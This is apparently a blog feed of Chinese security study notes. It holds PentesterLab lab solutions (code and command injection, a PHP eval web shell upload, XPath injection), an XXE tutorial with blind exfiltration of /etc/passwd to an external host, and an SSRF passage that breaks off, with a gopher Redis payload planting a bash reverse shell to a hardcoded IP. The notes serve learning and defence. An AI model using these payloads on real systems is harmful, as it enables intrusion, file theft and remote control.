&quot;&lt;/table&gt;&quot;;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>create_function()的不当使用造成代码注入，可以这样构造);}phpinfo();//<br>执行我们的命令，);}是闭合了前面的代码，而//则是将后面的内容注释掉</p>
<h4 id="Payload-21"><a href="#Payload-21" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example2.php?order=id);&#125;phpinfo();//</div></pre></td></tr></table></figure>
<h3 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</p>
<h4 id="Payload-22"><a href="#Payload-22" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example3.php?new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</div></pre></td></tr></table></figure>
<h3 id="Example-4-2"><a href="#Example-4-2" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">  // ensure name is not empty   </div><div class="line">  assert(trim(&quot;&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;&quot;));  </div><div class="line">  echo &quot;Hello &quot;.htmlentities($_GET[&apos;name&apos;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>如此构造即可：hacker’.phpinfo().’</p>
<h4 id="Payload-23"><a href="#Payload-23" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example4.php?name=hacker&apos;.phpinfo().&apos;</div></pre></td></tr></table></figure>
<h2 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h2><h3 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-24"><a href="#Payload-24" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1|id</div></pre></td></tr></table></figure>
<h3 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     die(&quot;Invalid IP address&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>正则表达式中有一个修饰符/m。它只检查一行，不关心下一行,此时我们可以利用%0a（换行符）绕过</p>
<h4 id="Payload-25"><a href="#Payload-25" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0aid</div></pre></td></tr></table></figure>
<h3 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>利用Location重定向到example3.php?ip=127.0.0.1，这里可以是用curl、burpsuite和nc查看回显</p>
<h4 id="Payload-26"><a href="#Payload-26" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n&quot; | nc 192.168.56.101 80</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1|ls</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pentesterlab1.png" alt=""></p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h3><p>直接上传一句话木马1.php。</p>
<h4 id="Payload-27"><a href="#Payload-27" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata1.png" alt=""></p>
<h3 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example 2"></a>Example 2</h3><p>直接上传一句话木马1.php。失败。</p>
<p>把上传文件的文件名修改为1.php.aaaa<br>对于apache这样的服务器，碰到aaaa发现是不认识的文件名后缀，然后就会跳过这个文件名，解析下一个文件名。<br>成功上传</p>
<p>根据php版本也可以尝试.php3,.php4,.php5此类后缀名进行上传。</p>
<h4 id="Payload-28"><a href="#Payload-28" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php.aaaaa</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php3</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata2.png" alt=""></p>
<h2 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h2><h3 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$xml=simplexml_load_string($_GET[&apos;xml&apos;]);</div><div class="line">	print_r((string)$xml);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>直接读取/etc/passwd</p>
<h4 id="Payload-29"><a href="#Payload-29" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</div></pre></td></tr></table></figure>
<p>Url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</div></pre></td></tr></table></figure>
<h3 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php require_once(&quot;../header.php&quot;);</div><div class="line"></div><div class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</div><div class="line"></div><div class="line">  $xml=simplexml_load_string($x);</div><div class="line">  $xpath = &quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</div><div class="line">  $res = ($xml-&gt;xpath($xpath));</div><div class="line">  while(list( ,$node) = each($res)) &#123;</div><div class="line">      echo $node;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-30"><a href="#Payload-30" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="external">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="external">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="external">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="external">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="external">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="external">Web渗透测试攻略(下)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>XML实体注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/XML实体注入漏洞的利用与学习.html</id>
    <published>2017-07-18T05:34:42.000Z</published>
    <updated>2017-07-20T02:53:35.094Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><h4 id="使用simplexml-load-string函数解析body"><a href="#使用simplexml-load-string函数解析body" class="headerlink" title="使用simplexml_load_string函数解析body"></a>使用simplexml_load_string函数解析body</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = file_get_contents(&apos;php://input&apos;);</div><div class="line">$xml = simplexml_load_string($data);</div><div class="line">echo $xml-&gt;name;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><h4 id="漏洞测试方式1"><a href="#漏洞测试方式1" class="headerlink" title="漏洞测试方式1"></a>漏洞测试方式1</h4><p>有回显，直接读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe.png" alt=""></p>
<h4 id="漏洞测试方式2"><a href="#漏洞测试方式2" class="headerlink" title="漏洞测试方式2"></a>漏洞测试方式2</h4><p>无回显，引用远程服务器上的XML文件读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</div><div class="line">%remote;]&gt;</div></pre></td></tr></table></figure>
<p>将以下1.xml保存到WEB服务器下<br>1.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; </div><div class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe1.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe3.png" alt=""></p>
<h4 id="漏洞测试方式3"><a href="#漏洞测试方式3" class="headerlink" title="漏洞测试方式3"></a>漏洞测试方式3</h4><p>在主机上放一个接收文件的php(get.php):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">file_put_contents(&apos;01.txt&apos;, $_GET[&apos;xxe_local&apos;]);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>1.xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload	SYSTEM	 &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://xxe.com/get.php?xxe_local=%payload;&apos;&gt;&quot;&gt;</div><div class="line"></div><div class="line">%int;</div><div class="line"></div><div class="line">%trick;</div></pre></td></tr></table></figure></p>
<p>这个XML，他引用了外部实体etc/passwd作为payload的值，然后又将payload拼接到<a href="http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。" target="_blank" rel="external">http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。</a></p>
<p>接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。</p>
<p>发包过去后，就会请求1.xml，解析这个xml造成XXE攻击，读取etc/passwd并进行base64编码后传给get.php，最后保存到主机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe2.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe4.png" alt=""></p>
<p>查看01.txt<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe5.png" alt=""></p>
<p>base64解码<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe6.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe7.png" alt=""><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe8.png" alt=""></p>
<h2 id="XXE-危害"><a href="#XXE-危害" class="headerlink" title="XXE 危害"></a>XXE 危害</h2><ul>
<li>读取任意文件</li>
<li>执行系统命令</li>
<li>探查内网端口</li>
<li>攻击内网网站</li>
</ul>
<h3 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<h3 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<h3 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h3><p>结合其他的漏洞比如：struts2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>方案一、使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line"></div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
<p>方案二、过滤用户提交的XML数据</p>
<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://github.com/phith0n/vulhub/tree/master/php_xxe" target="_blank" rel="external">vulhub/php_xxe/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-098591.html" target="_blank" rel="external">Z-BLOG Blind-XXE造成任意文件读取 </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html</id>
    <published>2017-07-17T03:27:46.000Z</published>
    <updated>2017-07-21T01:10:06.820Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>拿常用的cURL举例，cURL默认支持的协议非常多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ curl -V</div><div class="line">curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  </div><div class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  </div><div class="line">Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets</div></pre></td></tr></table></figure>
<h4 id="本地利用姿势"><a href="#本地利用姿势" class="headerlink" title="本地利用姿势"></a>本地利用姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># dict protocol (操作Redis)</div><div class="line">curl -vvv &apos;dict://127.0.0.1:6379/info&apos;</div><div class="line"></div><div class="line"># file protocol (任意文件读取)</div><div class="line">curl -vvv &apos;file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol (一键反弹Bash)</div><div class="line"># * 注意: 链接使用单引号，避免$变量问题</div><div class="line">curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function curl($url)&#123;  </div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div></pre></td></tr></table></figure>
<h4 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 利用file协议任意文件读取</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># 利用dict协议查看端口</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</div><div class="line"></div><div class="line"># 利用gopher协议反弹shell</div><div class="line">curl -v 